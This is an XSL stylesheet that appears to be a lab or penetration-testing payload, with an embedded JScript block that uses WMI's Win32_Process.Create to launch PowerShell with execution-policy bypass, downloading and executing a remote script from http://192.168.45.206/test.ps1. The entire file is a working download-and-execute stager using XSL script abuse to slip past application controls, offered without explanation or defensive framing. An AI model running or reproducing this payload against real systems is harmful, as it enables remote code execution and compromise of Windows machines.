<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

<output method="text"/>
        <ms:script implements-prefix="user" language="JScript">
                <![CDATA[
                        var command = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.206/test.ps1'))";
                        var locator = new ActiveXObject("WbemScripting.SWbemLocator");
                        var service = locator.ConnectServer(".", "root\\cimv2");
                        var startup = service.Get("Win32_ProcessStartup");
                        var startupConfig = startup.SpawnInstance_();
                        var process = service.Get("Win32_Process");

                        var pid = new ActiveXObject("WScript.Shell").Environment("Process")("PROCESSID");
                        var result = process.Create(command, null, startupConfig, pid);
                ]]>
        </ms:script>
</stylesheet>